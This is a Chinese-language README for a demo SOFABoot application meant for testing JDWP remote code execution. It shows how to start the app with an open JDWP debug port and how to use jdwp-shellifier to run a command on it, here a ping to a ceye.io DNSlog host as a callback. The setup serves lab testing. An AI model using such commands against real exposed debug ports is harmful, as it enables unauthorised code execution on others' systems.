# jdwp_sofaboot
用于测试JDWP远程代码执行的DemoApp

打包应用
```
mvn package -DskipTests
```

启动应用
```
java -Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=9999 -jar ./target/boot/demo-bootstrap-0.0.1-SNAPSHOT-executable.jar
```
或
```
java -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=9999 -jar ./target/boot/demo-bootstrap-0.0.1-SNAPSHOT-executable.jar
```

利用[jdwp-shellifier](https://github.com/michaelpdu/jdwp-shellifier)设置触发点和命令
```
python jdwp-shellifier.py -t 127.0.0.1 -p 9999 --break-on 'java.lang.String.indexOf' --cmd 'ping root.8yvuyw.ceye.io'
```

这里使用的payload是DNSlog，可以直接在DNS server上查看相应的log信息。
